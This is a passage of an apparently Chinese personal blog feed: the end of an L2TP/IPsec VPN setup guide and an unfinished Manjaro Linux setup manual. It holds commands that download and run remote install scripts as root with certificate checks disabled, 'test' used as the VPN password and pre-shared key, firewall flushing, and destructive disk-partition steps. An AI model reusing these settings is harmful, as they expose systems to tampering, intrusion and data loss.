<h3 id="设置vpn账号密码"><a href="#设置vpn账号密码" class="headerlink" title="设置vpn账号密码"></a>设置vpn账号密码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># vim /etc/ppp/chap-secrets</span></span><br><span class="line"><span class="comment"># Secrets for authentication using CHAP</span></span><br><span class="line"><span class="comment"># client	server	secret			IP addresses</span></span><br><span class="line"><span class="built_in">test</span>              *     <span class="built_in">test</span>                       *</span><br></pre></td></tr></table></figure>

<h3 id="创建预共享密钥"><a href="#创建预共享密钥" class="headerlink" title="创建预共享密钥"></a>创建预共享密钥</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># vim /etc/ipsec.d/ipsec.secrets</span></span><br><span class="line">192.168.241.130  %any: PSK <span class="string">&quot;test&quot;</span></span><br></pre></td></tr></table></figure>

<p>192.168.241.130：是服务器网卡ip地址</p>
<p>PSK：PSK是预存共享密匙</p>
<h3 id="建立ipsec-与-l2tp-服务关联的配置文件"><a href="#建立ipsec-与-l2tp-服务关联的配置文件" class="headerlink" title="建立ipsec 与 l2tp 服务关联的配置文件"></a>建立ipsec 与 l2tp 服务关联的配置文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/ipsec.d/l2tp_psk.conf</span><br><span class="line">conn L2TP-PSK-NAT</span><br><span class="line">    rightsubnet=vhost:%priv</span><br><span class="line">    also=L2TP-PSK-noNAT</span><br><span class="line">conn L2TP-PSK-noNAT</span><br><span class="line">    authby=secret</span><br><span class="line">    pfs=no</span><br><span class="line">    auto=add</span><br><span class="line">    keyingtries=3</span><br><span class="line">    dpddelay=30</span><br><span class="line">    dpdtimeout=120</span><br><span class="line">    dpdaction=clear</span><br><span class="line">    rekey=no</span><br><span class="line">    ikelifetime=8h</span><br><span class="line">    keylife=1h</span><br><span class="line">    <span class="built_in">type</span>=transport</span><br><span class="line">    left=192.168.241.130  <span class="comment">#也是网卡IP</span></span><br><span class="line">    leftprotoport=17/1701</span><br><span class="line">    right=%any</span><br><span class="line">    rightprotoport=17/%any</span><br></pre></td></tr></table></figure>

<h2 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h2><h3 id="安装iptables"><a href="#安装iptables" class="headerlink" title="安装iptables"></a>安装iptables</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y iptables</span><br><span class="line">yum install iptables-services</span><br></pre></td></tr></table></figure>

<h3 id="永久关闭防火墙"><a href="#永久关闭防火墙" class="headerlink" title="永久关闭防火墙"></a>永久关闭防火墙</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl mask firewalld</span><br></pre></td></tr></table></figure>

<h3 id="iptables配置"><a href="#iptables配置" class="headerlink" title="iptables配置"></a>iptables配置</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -L -n</span><br><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -Z</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -s 192.168.2.0/24 -o ens33 -j MASQUERADE</span><br><span class="line">iptables -I FORWARD -s 192.168.2.0/24 -j ACCEPT</span><br><span class="line">iptables -I FORWARD -d 192.168.2.0/24 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p udp -m policy --<span class="built_in">dir</span> <span class="keyword">in</span> --pol ipsec -m udp --dport 1701 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p udp -m udp --dport 1701 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p udp -m udp --dport 500 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p udp -m udp --dport 4500 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p esp -j ACCEPT</span><br><span class="line">iptables -A INPUT -m policy --<span class="built_in">dir</span> <span class="keyword">in</span> --pol ipsec -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i ppp+ -m state --state NEW,RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>

<h3 id="开启ipsec"><a href="#开启ipsec" class="headerlink" title="开启ipsec"></a>开启ipsec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start ipsec</span><br><span class="line">systemctl <span class="built_in">enable</span> ipsec</span><br></pre></td></tr></table></figure>

<h3 id="排错"><a href="#排错" class="headerlink" title="排错"></a>排错</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ipsec verify</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/09/L2TP/image-20221209210709274.png" alt="image-20221209210709274"></p>
<p>粘贴这两句命令就行了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;0&quot;</span> &gt; /proc/sys/net/ipv4/conf/virbr0-nic/rp_filter</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;0&quot;</span> &gt; /proc/sys/net/ipv4/conf/virbr0/rp_filter</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/09/L2TP/image-20221209210806496.png" alt="image-20221209210806496"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart xl2tpd</span><br><span class="line">systemctl <span class="built_in">enable</span> xl2tpd</span><br><span class="line">systemctl status xl2tpd</span><br></pre></td></tr></table></figure>

<h2 id="登录vpn"><a href="#登录vpn" class="headerlink" title="登录vpn"></a>登录vpn</h2><p>测试！！！本人树莓派上成功搭建出L2TP，并且通过window系统和华为手机连接vpn都没有问题。</p>
<p>比较遗憾的是，无论是多账号还是单一账号，都只能一个设备登陆，原因可能是端口被占用了。</p>
<p><img src="/2022/12/09/L2TP/image-20221209211314458.png" alt="image-20221209211314458"></p>
<p><img src="/2022/12/09/L2TP/image-20221209211632696.png" alt="image-20221209211632696"></p>
<p><img src="/2022/12/09/L2TP/image-20221209211703852.png" alt="image-20221209211703852"></p>
<p><img src="/2022/12/09/L2TP/image-20221209211744310.png" alt="image-20221209211744310"></p>
<p>图左边是我看的直播VTB，右边是<code>nload</code>命令监控到服务器在帮我转发着流量</p>
<p><img src="/2022/12/09/L2TP/image-20221210012919413.png" alt="image-20221210012919413"></p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>重启服务器发现无法连接…真的无语</p>
<p>经过一段排错操作之后，原来是防火墙配置被还原了。</p>
<p>安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install -y netfilter-persistent iptables-persistent  <span class="comment"># centos的话把前面的apt换yum</span></span><br></pre></td></tr></table></figure>

<p>保存防火墙配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo netfilter-persistent save</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>L2TP</tag>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title>Manjaro-生存手册</title>
    <url>/2022/07/17/Manjaro-%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C/</url>
    <content><![CDATA[<p>[toc]</p>
<h3 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a><a href="https://manjaro.org/download/">下载镜像</a></h3><h4 id="选择镜像"><a href="#选择镜像" class="headerlink" title="选择镜像"></a>选择镜像</h4><h5 id="1-XFCE"><a href="#1-XFCE" class="headerlink" title="1.XFCE"></a>1.XFCE</h5><p><strong>Xfce 是一个用于类 UNIX 操作系统的轻量级桌面环境。它的目标是快速和低系统资源，同时仍然具有视觉吸引力和用户友好性。Xfce 体现了传统的 UNIX 模块化和可重用性哲学。它由许多组件组成，这些组件提供了现代桌面环境所期望的全部功能。它们是单独包装的，您可以在可用的软件包中进行选择，以创建最佳的个人工作环境。</strong></p>
<h5 id="2-KDE-Plasma"><a href="#2-KDE-Plasma" class="headerlink" title="2.KDE Plasma"></a>2.KDE Plasma</h5><p><strong>KDE Plasma 适合那些想要用户友好和可定制桌面的人。它是一个功能丰富且用途广泛的桌面环境，提供多种不同风格的菜单来访问应用程序。一个出色的内置界面，可以轻松访问和安装来自互联网的新主题、小部件等，也值得一提。默认情况下，KDE Plasma 很简单，它是一个干净的工作区域，供实际使用，不会妨碍您，因此用户可以创建工作流程，从而更有效地完成任务。</strong></p>
<h5 id="3-GNOME"><a href="#3-GNOME" class="headerlink" title="3.GNOME"></a>3.GNOME</h5><p><strong>对于想要一个非常现代和简单的桌面的人</strong></p>
<p><strong>简单来说，这就是像ubuntu那样的桌面，算是极简主义者的天堂了。</strong></p>
<h3 id="制造启动U盘"><a href="#制造启动U盘" class="headerlink" title="制造启动U盘"></a><a href="https://www.balena.io/etcher/">制造启动U盘</a></h3><h4 id="下载工具"><a href="#下载工具" class="headerlink" title="下载工具"></a>下载工具</h4><p>这里我们去<code>balenaEtcher</code>的官网下载一个便携式的u盘刻录工具，萌新前期可以通过这个工具把我们需要装的系统刻录进u盘中。(如果觉得一次只能刻录一个镜像而感到苦恼的话，也可以去<a href="https://www.ventoy.net/cn/index.html">ventoy官网</a>下载ventoy这款无敌的工具，能够兼容多个系统镜像，真正让你的u盘不再唯一)</p>
<p>刻录好u盘之后我们可以开始进行我们的系统安装了！！！</p>
<h3 id="1-单系统-manjaro"><a href="#1-单系统-manjaro" class="headerlink" title="1.单系统(manjaro)"></a>1.单系统(manjaro)</h3><h3 id="2-双系统-window10-manjaro"><a href="#2-双系统-window10-manjaro" class="headerlink" title="2.双系统(window10 + manjaro)"></a>2.双系统(window10 + manjaro)</h3><h3 id="一-与window10-efi-共存方案"><a href="#一-与window10-efi-共存方案" class="headerlink" title="一.与window10 efi 共存方案"></a>一.与window10 efi 共存方案</h3><h3 id="二-单独一个-manjaro-efi-方案"><a href="#二-单独一个-manjaro-efi-方案" class="headerlink" title="二.单独一个 manjaro efi 方案"></a>二.单独一个 manjaro efi 方案</h3><h3 id="三-如何删除双系统下的manjaro系统"><a href="#三-如何删除双系统下的manjaro系统" class="headerlink" title="三.如何删除双系统下的manjaro系统"></a>三.如何删除双系统下的manjaro系统</h3><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p><strong>直接在window系统上面格式化manjaro的磁盘是不能完全删除manjaro的，这样做会触发efi检测不到manjaro硬盘而进入grub模式！！！</strong></p>
<h4 id="1-EFI根除教程"><a href="#1-EFI根除教程" class="headerlink" title="1.EFI根除教程"></a>1.EFI根除教程</h4><p><strong>1.删除EFI首先在cmd里面把装系统的那个分区显现出来，并且赋予盘符号。</strong></p>
<ul>
<li><p><strong>1.用diskpart来对磁盘进行操作</strong></p>
<p><img src="/2022/07/17/Manjaro-%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(52).png"></p>
</li>
<li><p><strong>然后给diskpart授权开启</strong></p>
<p><img src="/2022/07/17/Manjaro-%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(53).png"></p>
</li>
<li><p><strong>2.查看磁盘命令</strong></p>
<p><img src="/2022/07/17/Manjaro-%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(54).png"></p>
</li>
<li><p><strong>3.选中目标磁盘0用select disk 0命令</strong></p>
<p><img src="/2022/07/17/Manjaro-%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(55).png"></p>
</li>
<li><p>4.列出该磁盘下的所有分区信息用<strong>list partition</strong>命令</p>
<p><img src="/2022/07/17/Manjaro-%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(56).png"></p>
</li>
<li><p><strong>5.选择我们的EFI系统分区用select partition 1命令（在这一步也可以删掉选中盘的所有内容（命令是delete partition override）（执行这条命令相当于把那个分区抹去了））</strong></p>
<p><img src="/2022/07/17/Manjaro-%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(57).png"></p>
</li>
<li><p><strong>6.用命令给这个EFI分区赋予盘符之后，它就会像一个磁盘出现在电脑里面，命令是assign letter&#x3D;p（这里p是盘符号，你也可以按照自己喜欢来打其他字母，只要不重复就好。）</strong></p>
<p><img src="/2022/07/17/Manjaro-%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(49).png"></p>
</li>
<li><p><strong>7.然后你就神奇的发现多了一个p盘分区（这个叫SYSTEM的磁盘分区就是那个EFI）</strong></p>
<p><img src="/2022/07/17/Manjaro-%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(58).png"></p>
</li>
<li><p>8.这个时候你可以使用<strong>新建文本文档</strong>在里面打开这个p盘里面<strong>删掉EFI里面的系统启动文件</strong>或者用<strong>Total Commander 64 bit</strong>这个东西来删除里面的<strong>删掉EFI里面的系统启动文件</strong>（<strong>千万别把整个EFI干掉，那就是一把梭，莽！！！</strong>）<br><img src="/2022/07/17/Manjaro-%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(59).png"><br><img src="/2022/07/17/Manjaro-%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(48).png"><br><img src="/2022/07/17/Manjaro-%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(60).png"></p>
</li>
<li><p><strong>然后移除盘符p用命令remove letter&#x3D;p</strong></p>
<p><img src="/2022/07/17/Manjaro-%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(61).png"></p>
<p><img src="/2022/07/17/Manjaro-%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(62).png"></p>
</li>
</ul>
<h4 id="2-删除卷"><a href="#2-删除卷" class="headerlink" title="2.删除卷"></a>2.删除卷</h4><p><strong>右键<code>此电脑</code>—&gt;单击<code>管理</code>—&gt;单击<code>磁盘管理</code>—&gt;找到你分配给<code>manjaro</code>的磁盘，直接右击<code>删除卷</code>，然后重新添加新的分区就行了。</strong></p>
<h2 id="3-manjaro系统入门操作-过不了就躺板板吧，别学了"><a href="#3-manjaro系统入门操作-过不了就躺板板吧，别学了" class="headerlink" title="3.manjaro系统入门操作(过不了就躺板板吧，别学了)"></a>3.manjaro系统入门操作(过不了就躺板板吧，别学了)</h2><h3 id="一-换源"><a href="#一-换源" class="headerlink" title="一.换源"></a>一.换源</h3><h4 id="1-换国内软件源"><a href="#1-换国内软件源" class="headerlink" title="1.换国内软件源"></a>1.换国内软件源</h4><p>安装完成manjaro的第一步就是给manjaro换上国内源，使接下来能安装软件等其他操作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman-mirrors -i -c China -m rank <span class="comment">#在弹出来的面板选择一道两个时间短的源</span></span><br></pre></td></tr></table></figure>

<p>下面这个跟上面那一步操作类似，它是直接把源放入到文件里面一步到位(注意：这个源要放文件内容最前面)，有上面命令的操作可以跳过导入源到mirrorlist这一步。</p>
<p>首先把这几个源加入到这个文件里面：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/pacman.d/mirrorlist    <span class="comment">#因为没有软件源，我没办法下载vim,所以这里我用的编辑器是vi,你们可以使用nano</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Country : China</span></span><br><span class="line">Server = https://mirrors.huaweicloud.com/manjaro/stable/<span class="variable">$repo</span>/<span class="variable">$arch</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Country : China</span></span><br><span class="line">Server = https://mirrors.ustc.edu.cn/manjaro/stable/<span class="variable">$repo</span>/<span class="variable">$arch</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Country : China</span></span><br><span class="line">Server = https://mirrors.sjtug.sjtu.edu.cn/manjaro/stable/<span class="variable">$repo</span>/<span class="variable">$arch</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Country : China</span></span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/manjaro/stable/<span class="variable">$repo</span>/<span class="variable">$arch</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Country : China</span></span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/manjaro/stable/<span class="variable">$repo</span>/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure>

<h4 id="2-添加cn软件源-完成这步，就可以正常下载东西了"><a href="#2-添加cn软件源-完成这步，就可以正常下载东西了" class="headerlink" title="2.添加cn软件源(完成这步，就可以正常下载东西了)"></a>2.添加cn软件源(完成这步，就可以正常下载东西了)</h4><p>这里我使用的是中科大的软件源：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/pacman.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#中科大源</span></span><br><span class="line">[archlinuxcn]</span><br><span class="line">SigLevel = Optional TrustedOnly</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -Syyu                     <span class="comment">#更新整个系统</span></span><br><span class="line">pacman -S archlinuxcn-keyring    <span class="comment">#安装密钥环密钥</span></span><br></pre></td></tr></table></figure>

<h4 id="注意：如果更新的时候出现manjaro-pacman：“GPGME错误：无数据”问题"><a href="#注意：如果更新的时候出现manjaro-pacman：“GPGME错误：无数据”问题" class="headerlink" title="注意：如果更新的时候出现manjaro  pacman：“GPGME错误：无数据”问题"></a>注意：如果更新的时候出现manjaro  pacman：“GPGME错误：无数据”问题</h4><p>如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -Syyu</span><br><span class="line">错误：GPGME error: 无数据</span><br><span class="line">错误：GPGME error: 无数据</span><br><span class="line">错误：GPGME error: 无数据</span><br><span class="line">错误：GPGME error: 无数据</span><br><span class="line">错误：GPGME error: 无数据</span><br><span class="line">:: 正在同步软件包数据库...</span><br><span class="line"> core 已经是最新版本        0.0   B  0.00B/s 00:00 [----------------------]   0%</span><br><span class="line"> extra 已经是最新版本       0.0   B  0.00B/s 00:00 [----------------------]   0%</span><br><span class="line"> community 已经是最新版本   0.0   B  0.00B/s 00:00 [----------------------]   0%</span><br><span class="line"> multilib-testing 已经是最新版本  B  0.00B/s 00:00 [----------------------]   0%</span><br><span class="line"> multilib 已经是最新版本    0.0   B  0.00B/s 00:00 [----------------------]   0%</span><br><span class="line">错误：数据库 <span class="string">&#x27;core&#x27;</span> 无效 (无效或已损坏的数据库 (PGP 签名))</span><br><span class="line">错误：数据库 <span class="string">&#x27;extra&#x27;</span> 无效 (无效或已损坏的数据库 (PGP 签名))</span><br><span class="line">错误：数据库 <span class="string">&#x27;community&#x27;</span> 无效 (无效或已损坏的数据库 (PGP 签名))</span><br><span class="line">错误：数据库 <span class="string">&#x27;multilib-testing&#x27;</span> 无效 (无效或已损坏的数据库 (PGP 签名))</span><br><span class="line">错误：数据库 <span class="string">&#x27;multilib&#x27;</span> 无效 (无效或已损坏的数据库 (PGP 签名))</span><br></pre></td></tr></table></figure>

<p>只需要执行这条命令就可以正常启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">rm</span> -R /var/lib/pacman/sync</span><br></pre></td></tr></table></figure>

<h3 id="二-常用工具"><a href="#二-常用工具" class="headerlink" title="二.常用工具"></a>二.常用工具</h3><h4 id="1-vim编辑工具"><a href="#1-vim编辑工具" class="headerlink" title="1.vim编辑工具"></a>1.vim编辑工具</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S vim         <span class="comment"># vim编辑器永远的神</span></span><br></pre></td></tr></table></figure>

<h4 id="2-时间同步-非常重要，影响科学上网的vmess协议"><a href="#2-时间同步-非常重要，影响科学上网的vmess协议" class="headerlink" title="2.时间同步(非常重要，影响科学上网的vmess协议)"></a>2.时间同步(非常重要，影响科学上网的vmess协议)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#硬件时间and系统时间</span></span><br><span class="line"><span class="comment">#这2个时间不是同步的！如果有一天发现系统的时间不对了，可以分别看看这2个时间。硬件时间写在BIOS里，系统时间就是电脑显示的时间了。</span></span><br><span class="line"><span class="comment">#这个显示的时硬件时间。</span></span><br><span class="line">sudo hwclock -r                                                                               </span><br><span class="line">[sudo] <span class="variable">$home</span> 的密码：</span><br><span class="line">2022-01-21 17:28:32.107794+08:00</span><br><span class="line"></span><br><span class="line"><span class="comment">#在使用ntpdate同步网络时间后可以将时间写入到BIOS：</span></span><br><span class="line"><span class="comment">#同步网络时间：</span></span><br><span class="line">sudo ntpdate time.windows.com</span><br><span class="line">21 Jan 17:30:46 ntpdate[1898]: adjust time server 20.189.79.72 offset -0.276329 sec</span><br><span class="line"></span><br><span class="line"><span class="comment">#写入BIOS：</span></span><br><span class="line">sudo  hwclock -w <span class="comment">#写入BISO</span></span><br><span class="line"><span class="comment">#再看看现在的时间</span></span><br><span class="line">sudo  hwclock -r</span><br><span class="line">2014年12月31日 星期三 20时26分03秒  -0.979207 seconds</span><br></pre></td></tr></table></figure>

<h4 id="3-安装yay"><a href="#3-安装yay" class="headerlink" title="3.安装yay"></a>3.安装yay</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S yay <span class="comment">#yay可以安装archlinux wiki上面的AUR软件包，给archlinux点赞</span></span><br></pre></td></tr></table></figure>

<p><a href="https://aur.archlinux.org/packages/">Archlinux庞大的AUR软件包地址，需要软件包直接进去搜索</a></p>
<h4 id="4-安装一个非常重要的基础库base-devel"><a href="#4-安装一个非常重要的基础库base-devel" class="headerlink" title="4.安装一个非常重要的基础库base-devel"></a>4.安装一个非常重要的基础库base-devel</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo pacman -S base-devel</span><br><span class="line">#:: 在组 base-devel 中有 24 成员：</span><br><span class="line">#:: 软件仓库 core</span><br><span class="line">   1) autoconf  2) automake  3) binutils  4) bison  5) fakeroot  6) file  7) findutils  8) flex  9) gawk</span><br><span class="line">   10) gcc  11) gettext  12) grep  13) groff  14) gzip  15) libtool  16) m4  17) make  18) pacman  19) patch</span><br><span class="line">   20) pkgconf  21) sed  22) sudo  23) texinfo  24) which</span><br><span class="line">#这个基础包必须安装，否则我们在使用yay安装AUR软件的时候经常会遇到安装不上的问题。</span><br></pre></td></tr></table></figure>

<h3 id="三-安装输入法"><a href="#三-安装输入法" class="headerlink" title="三.安装输入法"></a>三.安装输入法</h3><p><a href="https://wiki.archlinux.org/index.php/Fcitx5_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">Fcitx5 官方文档</a><br>中文及日文输入法均体验良好。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fcitx5-im <span class="comment">#基础包组</span></span><br><span class="line">sudo pacman -S fcitx5-chinese-addons <span class="comment">#官方中文输入引擎</span></span><br><span class="line">sudo pacman -S fcitx5-anthy <span class="comment">#日文输入引擎</span></span><br><span class="line">yay -S fcitx5-pinyin-moegirl <span class="comment">#萌娘百科词库 由于中国大陆政府对github封锁，你可能在此卡住。如卡住，可根据后文设置好代理后再安装</span></span><br><span class="line">sudo pacman -S fcitx5-pinyin-zhwiki <span class="comment">#中文维基百科词库</span></span><br><span class="line">sudo pacman -S fcitx5-material-color <span class="comment">#主题</span></span><br></pre></td></tr></table></figure>

<p>设置环境变量 编辑文件 <code>sudo vim /etc/environment</code> 加入以下内容。konsole 以及 dolphin 都需要这些环境变量，倒是 chrome 和 firefox 都不需要就可以输入中文</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GTK_IM_MODULE=fcitx</span><br><span class="line">QT_IM_MODULE=fcitx</span><br><span class="line">XMODIFIERS=@im=fcitx</span><br><span class="line">SDL_IM_MODULE=fcitx</span><br></pre></td></tr></table></figure>

<p>打开 <em>系统设置</em> &gt; <em>区域设置</em> &gt; _输入法_，先点击<code>运行Fcitx</code>即可，拼音为默认添加项。如你还需要更多输入法如五笔，则再点击<code>添加输入法</code>，找到简体中文下的五笔 ，点击添加即可加入五笔输入法。(建议，无论什么输入法都留一个英文的输入法在首位置)。</p>
<p>接下来点击 <em>拼音</em> 右侧的配置按钮，点选<code>云拼音</code>和<code>在程序中显示预编辑文本</code> 最后应用。</p>
<p>回到输入法设置，点击<code>配置附加组件</code>，找到 <em>经典用户界面</em> 在主题里选择一个你喜欢的颜色 最后应用。</p>
<p>注销，重新登陆，就可以发现已经可以在各个软件中输入中文了</p>
<h3 id="四-聊天工具"><a href="#四-聊天工具" class="headerlink" title="四.聊天工具"></a>四.聊天工具</h3><p>我们日常使用的聊天工具无非就是微信,QQ,Telegram</p>
<p>这个时候，我们可以去<a href="https://aur.archlinux.org/packages/">Archlinux庞大的AUR软件</a>里面搜索</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#微信</span></span><br><span class="line">yay -S deepin-wine-wechat</span><br><span class="line"><span class="comment">#QQ</span></span><br><span class="line">yay -S deepin-wine-qq</span><br><span class="line"><span class="comment">#Telegram</span></span><br><span class="line">sudo pacman  -S telegram-desktop</span><br></pre></td></tr></table></figure>

<h3 id="五-科学上网"><a href="#五-科学上网" class="headerlink" title="五.科学上网"></a>五.科学上网</h3><h4 id="服务器端-Server端"><a href="#服务器端-Server端" class="headerlink" title="服务器端(Server端)"></a>服务器端(Server端)</h4><h5 id="1-科学上网服务器-外网服务器一台"><a href="#1-科学上网服务器-外网服务器一台" class="headerlink" title="1.科学上网服务器(外网服务器一台)"></a>1.科学上网服务器(外网服务器一台)</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统是centos7,更新软件</span></span><br><span class="line">yum update -y &amp;&amp; yum upgrade &amp;&amp; yum install curl -y &amp;&amp; yum -y install wget</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 脚本</span></span><br><span class="line">wget -P /root -N --no-check-certificate <span class="string">&quot;https://raw.githubusercontent.com/mack-a/v2ray-agent/master/install.sh&quot;</span> &amp;&amp; <span class="built_in">chmod</span> 700 /root/install.sh &amp;&amp; /root/install.sh</span><br></pre></td></tr></table></figure>

<h5 id="2-开启BBR加速"><a href="#2-开启BBR加速" class="headerlink" title="2.开启BBR加速"></a>2.开启BBR加速</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate -O tcpx.sh https://raw.githubusercontent.com/ylx2016/Linux-NetSpeed/master/tcpx.sh &amp;&amp; <span class="built_in">chmod</span> +x tcpx.sh &amp;&amp; ./tcpx.sh</span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line">lsmod | grep bbr</span><br></pre></td></tr></table></figure>

<h4 id="客户端-Client端"><a href="#客户端-Client端" class="headerlink" title="客户端(Client端)"></a>客户端(Client端)</h4><h3 id="六-美化系统"><a href="#六-美化系统" class="headerlink" title="六.美化系统"></a>六.美化系统</h3><h3 id="七-虚拟化"><a href="#七-虚拟化" class="headerlink" title="七.虚拟化"></a>七.虚拟化</h3><h4 id="1-VMwareWorkstation-篇"><a href="#1-VMwareWorkstation-篇" class="headerlink" title="1.VMwareWorkstation 篇"></a>1.VMwareWorkstation 篇</h4><h4 id="2-VirtualBox篇"><a href="#2-VirtualBox篇" class="headerlink" title="2.VirtualBox篇"></a>2.VirtualBox篇</h4><h4 id="3-docker-篇-初级"><a href="#3-docker-篇-初级" class="headerlink" title="3.docker 篇(初级)"></a>3.docker 篇(初级)</h4><h5 id="一-安装docker"><a href="#一-安装docker" class="headerlink" title="一.安装docker"></a>一.安装docker</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S docker</span><br></pre></td></tr></table></figure>

<p>启动docker</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>

<p>开机启动docker</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure>

<p>关掉开机启动docker</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemclt <span class="built_in">disable</span> docker</span><br></pre></td></tr></table></figure>

<h5 id="二-docker的帮助命令"><a href="#二-docker的帮助命令" class="headerlink" title="二.docker的帮助命令"></a>二.docker的帮助命令</h5><p>显示docker的版本信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure>




<h5 id="三-配置镜像加速和docker代理"><a href="#三-配置镜像加速和docker代理" class="headerlink" title="三.配置镜像加速和docker代理"></a>三.配置镜像加速和docker代理</h5><p><strong>镜像加速</strong></p>
